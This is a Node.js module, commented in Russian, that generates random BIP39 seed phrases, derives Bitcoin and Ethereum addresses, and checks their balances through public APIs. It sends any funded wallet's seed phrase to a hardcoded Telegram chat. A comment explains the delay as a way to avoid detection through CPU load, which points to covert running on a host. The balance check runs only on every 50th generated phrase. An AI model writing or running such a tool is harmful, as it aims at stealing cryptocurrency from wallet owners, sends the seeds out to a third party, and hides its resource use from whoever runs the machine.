const bip39 = require('bip39');
const bitcoin = require('bitcoinjs-lib');
const { ethers } = require('ethers');
const axios = require('axios');
const { bot } = require('./bot');

let isRunning = false;
let checkedCount = 0;

async function bruteLoop() {
    if (!isRunning) return;
    try {
        // Генерируем 12 слов (BTC)
        const mnemonic = bip39.generateMnemonic();
        const seed = await bip39.mnemonicToSeed(mnemonic);
        
        // BTC Адрес
        const root = bitcoin.bip32.fromSeed(seed);
        const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: root.derivePath("m/44'/0'/0'/0/0").publicKey });
        
        // ETH Адрес
        const wallet = ethers.Wallet.fromPhrase(mnemonic);
        const ethAddress = wallet.address;

        checkedCount++;

        // Проверяем баланс только раз в 50 итераций (чтобы не спамить API)
        if (checkedCount % 50 === 0) {
            try {
                // Проверка BTC
                const btcRes = await axios.get(`https://blockchain.info/q/addressbalance/${btcAddress}`, { timeout: 5000 });
                const btcBalance = parseInt(btcRes.data) / 100000000;
                
                // Проверка ETH
                const ethRes = await axios.get(`https://api.etherscan.io/api?module=account&action=balance&address=${ethAddress}&tag=latest&apikey=YourApiKeyToken`, { timeout: 5000 });
                const ethBalance = parseInt(ethRes.data.result) / 1e18;

                if (btcBalance > 0 || ethBalance > 0) {
                    await bot.telegram.sendMessage(9256345316, 
                        `🔥 НАЙДЕН КОШЕЛЕК!\n\n` +
                        `🏦 Биржа: Binance / Bybit\n` +
                        `📝 12 слов: \`${mnemonic}\`\n\n` +
                        `💰 Баланс BTC: ${btcBalance} BTC\n` +
                        `💰 Баланс ETH: ${ethBalance} ETH\n\n` +
                        `Адрес BTC: ${btcAddress}\n` +
                        `Адрес ETH: ${ethAddress}`,
                        { parse_mode: 'Markdown' }
                    );
                    isRunning = false; // Останавливаем после находки
                    return;
                }
            } catch (e) {
                // Игнорируем ошибки сети
            }
        }
    } catch (e) {}

    // Задержка 5 секунд, чтобы не спалиться по CPU
    setTimeout(bruteLoop, 5000);
}

function startCryptoSearch() {
    if (isRunning) return;
    isRunning = true;
    checkedCount = 0;
    console.log("Запущен поиск кошельков...");
    bruteLoop();
}

function stopCryptoSearch() {
    isRunning = false;
    console.log("Поиск остановлен.");
}

module.exports = { startCryptoSearch, stopCryptoSearch };
